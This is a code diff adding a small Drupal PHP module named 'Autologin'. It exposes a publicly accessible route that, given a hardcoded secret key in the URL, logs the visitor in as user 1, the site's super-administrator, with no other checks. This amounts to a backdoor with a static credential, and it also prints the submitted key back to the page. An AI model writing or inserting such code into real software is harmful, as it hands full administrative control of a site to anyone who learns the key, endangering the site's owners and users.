@@ -1,0 +1,35 @@
+<?php
+
+function autologin_menu() {
+  return array(
+      "yii_login" => array(
+        "title" => "Autologin",
+        "page callback" => "yii_auto_login_callback",
+         "access callback" => TRUE
+      )
+  );
+}
+
+function yii_auto_login_callback() {
+  $key = "hejdhsld_sdhjhelo_sd8e_sd";
+  print_r(arg(1));
+  if (arg(1) == $key) {
+    global $user;
+    $user = user_load(1);
+    
+    $user->login = REQUEST_TIME;
+    db_update('users')
+      ->fields(array('login' => $user->login))
+      ->condition('uid', $user->uid)
+      ->execute();
+
+    drupal_session_regenerate();
+    print "OK";
+    die();
+    //drupal_goto("<front>");
+  }
+  else {
+    print "wrong";
+    die();
+  }
+}
